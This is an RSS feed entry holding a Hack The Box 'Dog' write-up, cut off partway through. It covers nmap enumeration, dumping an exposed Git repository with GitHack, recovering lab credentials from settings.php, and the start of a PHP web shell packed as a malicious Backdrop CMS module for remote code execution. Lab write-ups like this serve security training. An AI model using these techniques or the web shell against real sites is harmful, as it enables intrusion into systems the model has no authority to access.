@@ -1,0 +1,343 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>GitHack on 01MI</title><link>https://01MI.github.io/tags/githack/</link><description>Recent content in GitHack on 01MI</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 12 Jul 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://01MI.github.io/tags/githack/index.xml" rel="self" type="application/rss+xml"/><item><title>Dog - Linux Easy - HTB Writeup</title><link>https://01MI.github.io/p/dog-htb-writeup-linux-easy/</link><pubDate>Sat, 12 Jul 2025 00:00:00 +0000</pubDate><guid>https://01MI.github.io/p/dog-htb-writeup-linux-easy/</guid><description>&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Dog.PNG" alt="Featured image of post Dog - Linux Easy - HTB Writeup" />&lt;h2 id="summary">Summary
+&lt;/h2>&lt;p>User: Webapp credentials in source code using GitHack + RCE via upload of a malicious archive.&lt;br>
+Root: Sudo misconfiguration of bee CLI.&lt;/p>
+&lt;h2 id="enumeration">Enumeration
+&lt;/h2>&lt;p>Using nmap, we can identify a web service on port 80 and SSH exposed on port 22.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 3
+&lt;/span>&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 8
+&lt;/span>&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">21
+&lt;/span>&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nmap&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">Pn&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="o">-&lt;/span> &lt;span class="mf">10.129.208.97&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">v&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">PORT&lt;/span> &lt;span class="nx">STATE&lt;/span> &lt;span class="nx">SERVICE&lt;/span> &lt;span class="nx">VERSION&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">22&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="nx">OpenSSH&lt;/span> &lt;span class="mf">8.2&lt;/span>&lt;span class="nx">p1&lt;/span> &lt;span class="nx">Ubuntu&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="nx">ubuntu0&lt;/span>&lt;span class="mf">.12&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Ubuntu&lt;/span> &lt;span class="nx">Linux&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">protocol&lt;/span> &lt;span class="mf">2.0&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">ssh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">hostkey&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="mi">3072&lt;/span> &lt;span class="mi">97&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">d2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">89&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">d3&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">ed&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">ac&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mo">00&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">d2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">87&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">49&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nf">a7&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">RSA&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="mi">256&lt;/span> &lt;span class="mi">27&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">eb&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">e9&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">62&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">59&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">b1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">38&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">c9&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">ae&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nf">b&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ECDSA&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="mi">256&lt;/span> &lt;span class="mi">93&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">88&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">69&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">af&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">72&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">09&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">ba&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">77&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nf">eb&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ED25519&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">80&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">http&lt;/span> &lt;span class="nx">Apache&lt;/span> &lt;span class="nx">httpd&lt;/span> &lt;span class="mf">2.4.41&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">Ubuntu&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">title&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Home&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nx">Dog&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">robots&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">22&lt;/span> &lt;span class="nx">disallowed&lt;/span> &lt;span class="nf">entries&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">15&lt;/span> &lt;span class="nx">shown&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">core&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">profiles&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">README&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">md&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">web&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">config&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">admin&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">comment&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">reply&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">filter&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tips&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">add&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">search&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">register&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">password&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">login&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">logout&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">admin&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">comment&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">reply&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">generator&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Backdrop&lt;/span> &lt;span class="nx">CMS&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//backdropcms.org)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">methods&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="nx">Supported&lt;/span> &lt;span class="nx">Methods&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">GET&lt;/span> &lt;span class="nx">HEAD&lt;/span> &lt;span class="nx">POST&lt;/span> &lt;span class="nx">OPTIONS&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">favicon&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Unknown&lt;/span> &lt;span class="nx">favicon&lt;/span> &lt;span class="nx">MD5&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mf">3836E83&lt;/span>&lt;span class="nx">A3E835A26D789DDA9E78C5510&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">server&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">header&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Apache&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">2.4.41&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Ubuntu&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">git&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="mf">10.129.208.97&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">80&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">git&lt;/span>&lt;span class="o">/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">Git&lt;/span> &lt;span class="nx">repository&lt;/span> &lt;span class="nx">found&lt;/span>&lt;span class="p">!&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">Repository&lt;/span> &lt;span class="nx">description&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Unnamed&lt;/span> &lt;span class="nx">repository&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">edit&lt;/span> &lt;span class="nx">this&lt;/span> &lt;span class="nx">file&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">description&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">name&lt;/span> &lt;span class="nx">the&lt;/span>&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="nx">Last&lt;/span> &lt;span class="nx">commit&lt;/span> &lt;span class="nx">message&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">todo&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">customize&lt;/span> &lt;span class="nx">url&lt;/span> &lt;span class="nx">aliases&lt;/span>&lt;span class="p">.&lt;/span> &lt;span class="nx">reference&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//docs.backdro...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;h2 id="user">User
+&lt;/h2>&lt;h3 id="git-dump--rce-via-shelltar">Git dump + RCE via shell.tar
+&lt;/h3>&lt;p>The nmap scan revealed that the git repository of the webapp is exposed.&lt;br>
+Using &lt;a class="link" href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener"
+>GitHack&lt;/a>, we are going to partially retrieve the source code of this web application.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">4
+&lt;/span>&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">GitHack&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="nx">index&lt;/span> &lt;span class="nx">lib&lt;/span> &lt;span class="nx">README&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">md&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">python&lt;/span> &lt;span class="nx">GitHack&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//dog.htb/.git&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Download&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">parse&lt;/span> &lt;span class="nx">index&lt;/span> &lt;span class="nx">file&lt;/span> &lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">LICENSE&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">README&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">md&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">core&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">jshintignore&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+In those files, we can find a username &lt;code>tiffany&lt;/code> and a password &lt;code>BackDropJ2024DS2024&lt;/code>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">4
+&lt;/span>&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">ir&lt;/span> &lt;span class="nx">dog&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span> &lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">files&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">config_83dddd18e1ec67fd8ff5bba2453c7fb3&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">active&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">update&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">settings&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">json&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;tiffany@dog.htb&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">n&lt;/span> &lt;span class="nx">settings&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">15&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">database&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">mysql&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//root:BackDropJ2024DS2024@127.0.0.1/backdrop&amp;#39;;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>Using those credentials, we gain access to the webapp &lt;code>http://dog.htb&lt;/code> as &lt;code>tiffany&lt;/code>.&lt;br>
+We can find the version of &lt;code>Backdrop&lt;/code> in the &lt;code>Reports&lt;/code> tab then &lt;code>Status report&lt;/code>.&lt;br>
+This version &lt;code>1.27.7&lt;/code> is vulnerable to an RCE.
+&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_version.PNG"
+width="1022"
+height="492"
+srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_version_hu_abe110edb435d067.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_version_hu_3a56188cfc8c59ea.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="207"
+data-flex-basis="498px"
+>&lt;/p>
+&lt;p>The following &lt;a class="link" href="https://www.exploit-db.com/exploits/52021" target="_blank" rel="noopener"
+>exploit&lt;/a> could work but our instance of backdrop doesn&amp;rsquo;t accept &lt;code>.zip&lt;/code> archives.&lt;br>
+We can find this information in the &lt;code>Functionality&lt;/code> tab then &lt;code>Install new modules&lt;/code>.
+&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_zip.PNG"
+width="1273"
+height="557"
+srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_zip_hu_3353f62be050b291.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_zip_hu_4194d30c27ed02da.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="228"
+data-flex-basis="548px"
+>&lt;/p>
+&lt;p>So, we are going to take the HTML/PHP code and &lt;code>shell.info&lt;/code> content of this exploit in order to create a &lt;code>shell.tar&lt;/code> archive.&lt;br>
+Then, on the same page we are going to install this new module.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">19
+&lt;/span>&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">36
+&lt;/span>&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">form&lt;/span> &lt;span class="nx">method&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;GET&amp;#34;&lt;/span> &lt;span class="nx">name&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;?php echo basename($_SERVER[&amp;#39;PHP_SELF&amp;#39;]); ?&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
